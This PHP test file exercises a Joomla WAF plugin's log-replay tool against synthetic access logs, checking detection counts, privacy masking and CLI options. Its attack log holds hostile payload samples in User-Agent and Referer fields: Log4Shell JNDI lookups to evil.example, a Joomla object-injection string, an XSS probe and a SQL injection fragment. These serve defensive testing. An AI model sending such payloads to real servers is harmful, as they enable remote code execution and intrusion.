<?php
/**
 * waf_replay.php: summary-only output, masking, formats, failure handling.
 * Included by run.php; runs the real CLI script against synthetic logs.
 *
 * @package     Colorpack Shield
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

echo "== Replay tool: summary-only ==\n";

$replay = realpath(__DIR__ . '/../plugins/system/colorpack_shield/cli/waf_replay.php');
$rdir   = sys_get_temp_dir() . '/cps-replay-' . bin2hex(random_bytes(4));
mkdir($rdir);

$benignUa = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'curl/8.4.0',
];
$benignRef = ['-', 'https://www.google.com/', 'https://www.google.com/search?q=joomla+union+select+tutorial', 'https://client-site.example/index.php?option=com_content&id=12'];

$logLine = static fn (string $ip, string $ref, string $ua, string $req = 'GET / HTTP/1.1'): string =>
    sprintf("%s - - [28/Oct/2026:10:00:00 +0700] \"%s\" 200 512 \"%s\" \"%s\"\n", $ip, $req, $ref, $ua);

// Benign-only log: nothing may be reported.
$benignLog = '';

for ($i = 0; $i < 400; $i++) {
    $benignLog .= $logLine('203.0.113.' . ($i % 200 + 1), $benignRef[$i % 4], $benignUa[$i % 4]);
}

file_put_contents("$rdir/benign.log", $benignLog);
exec(escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg($replay) . ' ' . escapeshellarg("$rdir/benign.log") . ' 2>&1', $out, $code);
$text = implode("\n", $out);
ipCheck('benign log: exit 0, "No findings."', $code === 0 && str_contains($text, 'No findings.'));
ipCheck('benign log: 400 lines read and parsed', str_contains($text, 'Lines read: 400') && str_contains($text, 'Parsed: 400'));

// A log with attacks, a gzip copy, an unparsable line and escaped quotes.
$attackLog  = $benignLog;
$attackLog .= $logLine('198.51.100.77', '-', '${jndi:ldap://evil.example/a}');
$attackLog .= $logLine('198.51.100.78', '-', '${jndi:ldap://evil.example/a}');
$attackLog .= $logLine('198.51.100.79', '-', '${jndi:ldap://evil.example/b}');
$attackLog .= $logLine('198.51.100.80', '-', '}__test|O:21:"JDatabaseDriverMysqli":1:{s:2:"fc";N;}'  === '' ? '' : str_replace('"', '\\"', '}__test|O:21:"JDatabaseDriverMysqli":1:{s:2:"fc";N;}'));
$attackLog .= $logLine('198.51.100.81', 'https://secret-client.example/path?token=ABC123&mail=boss@client.example', '<script>alert(1)</script>');
$attackLog .= $logLine('198.51.100.82', '-', 'foo\\x22 ${jndi:ldap://x/a}');                 // nginx-style \x22
$attackLog .= $logLine('198.51.100.83', '-', 'note 198.51.100.201 mail boss2@client.example ${jndi:ldap://x/a}');   // IP / e-mail inside the value
$attackLog .= $logLine('198.51.100.85', '-', 'v6 2001:db8:85a3::8a2e:370:7334 ${jndi:ldap://x/a}');   // IPv6 inside the value
$attackLog .= $logLine('198.51.100.84', 'https://secret-client2.example/a union select 1/?token=ZZZ', 'curl/8.4.0');   // Referer triggers a rule
$attackLog .= "this line is not in combined format at all 198.51.100.99\n";
file_put_contents("$rdir/attack.log", $attackLog);
file_put_contents("$rdir/attack2.log.gz", gzencode($logLine('198.51.100.90', '-', '${jndi:ldap://evil.example/c}')));

$run = static function (array $args) use ($replay): array {
    $cmd = escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg($replay);

    foreach ($args as $a) {
        $cmd .= ' ' . escapeshellarg($a);
    }

    exec($cmd . ' 2>&1', $o, $c);

    return [$c, implode("\n", $o)];
};

[$code, $text] = $run(["$rdir/attack.log", "$rdir/attack2.log.gz"]);
ipCheck('attack log: exit 0', $code === 0);
ipCheck('reports 2 files, parsed lines and 1 unparsable line', str_contains($text, 'Files: 2') && str_contains($text, 'Not in combined format: 1'));
ipCheck('jndi_lookup row: 7 lines (6 + the .gz one), BLOCK mode', (bool) preg_match('/^jndi_lookup\s+block\s+7\b/m', $text));
ipCheck('php_object_injection row: 1 line, block', (bool) preg_match('/^php_object_injection\s+block\s+1\b/m', $text));
ipCheck('xss_strict row: 1 line, log mode', (bool) preg_match('/^xss_strict\s+log\s+1\b/m', $text));
ipCheck('JNDI "distinct" counts distinct values', (bool) preg_match('/^jndi_lookup\s+block\s+7\s+\S+\s+6\b/m', $text));
ipCheck('a Referer finding is reported against the Referer header (sqli_strict, log)', (bool) preg_match('/^sqli_strict\s+log\s+1\b/m', $text) && str_contains($text, 'e.g. Referer:'));
ipCheck('totals: blocking vs log-only findings', str_contains($text, 'would BLOCK a request: 8') && str_contains($text, 'only be LOGGED:  2'));
ipCheck('nginx-style \\x22 is unescaped and still detected', (bool) preg_match('/^jndi_lookup/m', $text));
ipCheck('benign traffic added no finding of its own', substr_count($text, "\n    e.g.") <= 6);

// Privacy: no client IPs, no raw lines, masked examples.
[$code, $textAll] = $run(['--samples=50', "$rdir/attack.log", "$rdir/attack2.log.gz"]);   // every example, so the masking is really exercised
ipCheck('--samples=50 shows the IP/e-mail example in masked form', str_contains($textAll, '<ip>') && str_contains($textAll, '<email>') && str_contains($textAll, 'Referer: https://<host>/a union select 1/?<q>'));
$leaks = [];

foreach (['198.51.100.', '203.0.113.', 'secret-client.example', 'token=ABC123', 'boss@client.example', '[28/Oct/2026', 'GET / HTTP/1.1', 'not in combined format at all', '198.51.100.201', 'boss2@client.example', 'secret-client2.example', 'token=ZZZ', '2001:db8:85a3'] as $needle) {
    if (str_contains($text, $needle) || str_contains($textAll, $needle)) {
        $leaks[] = $needle;
    }
}

ipCheck('output never contains client IPs, IPs/e-mails inside values, raw log lines, hosts or query strings' . ($leaks ? ' — LEAKED: ' . implode(', ', $leaks) : ''), $leaks === []);
ipCheck('examples exist and are marked as masked', str_contains($text, 'e.g.') && str_contains($text, 'masked'));

// Options.
[$code, $text0] = $run(['--samples=0', "$rdir/attack.log"]);
ipCheck('--samples=0 prints no examples at all', !str_contains($text0, 'e.g.') && preg_match('/^jndi_lookup/m', $text0) === 1);
[$code, $textLog] = $run(['--mode=log', "$rdir/attack.log"]);
ipCheck('--mode=log: every finding is log-only', !preg_match('/^\S+\s+block\s/m', $textLog) && str_contains($textLog, 'would BLOCK a request: 0'));
[$code, $textBlock] = $run(['--mode=block', "$rdir/attack.log"]);
ipCheck('--mode=block: every finding would block', !preg_match('/^\S+\s+log\s/m', $textBlock));
[$code, $textMax] = $run(['--max-lines=10', "$rdir/attack.log"]);
ipCheck('--max-lines stops reading', str_contains($textMax, 'Lines read: 10'));
[$code, $textBad] = $run(['--mode=nonsense', "$rdir/attack.log"]);
ipCheck('invalid --mode: error exit 1', $code === 1 && str_contains($textBad, '--mode'));
[$code, $textNone] = $run(["$rdir/does-not-exist.log"]);
ipCheck('no readable file: usage error exit 1, nothing printed about content', $code === 1 && !str_contains($textNone, 'Lines read'));
[$code, $textDir] = $run([$rdir]);
ipCheck('a directory is not read', $code === 1);
[$code, $textGlob] = $run(["$rdir/*.log"]);
ipCheck('shell-style globs are accepted', $code === 0 && str_contains($textGlob, 'Files: 2'));
ipCheck('--help works and exits 0', $run(['--help'])[0] === 0);

// Read-only: the tool left the logs untouched and created nothing.
ipCheck('logs are unchanged and no new files appeared',
    md5_file("$rdir/attack.log") === md5($attackLog) && array_map('basename', glob("$rdir/*") ?: []) === ['attack.log', 'attack2.log.gz', 'benign.log']);

// CLI-only guard.
$web = shell_exec(escapeshellarg(PHP_BINARY) . ' -d variables_order=EGPCS -r ' . escapeshellarg('echo PHP_SAPI;'));
ipCheck('sanity: tests run under the cli SAPI the script requires', trim((string) $web) === 'cli');

array_map('unlink', glob("$rdir/*") ?: []);
@rmdir($rdir);
